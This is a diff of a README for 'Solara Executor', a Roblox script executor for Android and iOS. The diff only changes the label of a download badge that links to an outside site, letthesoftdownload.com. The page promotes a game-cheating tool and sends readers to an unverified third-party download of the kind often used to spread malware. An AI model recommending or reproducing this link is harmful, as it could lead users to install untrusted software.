@@ -6,7 +6,7 @@
 
 Welcome to the official repository of the **solara app**, a specialized scripting utility designed for mobile gaming environments. This documentation provides clear setup guidance, technical details, and performance configurations for utilizing the environment safely and effectively.
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://letthesoftdownload.com/solara)
+[![Download Now](https://img.shields.io/badge/Download-Solara_Executor-brightgreen?style=for-the-badge)](https://letthesoftdownload.com/solara)
 
 <img width="1317" height="734" alt="Solara Executor - Best Roblox Executor Android & iOS" src="https://github.com/user-attachments/assets/9c69d42f-6241-4d93-8669-932010c879ac" />
 
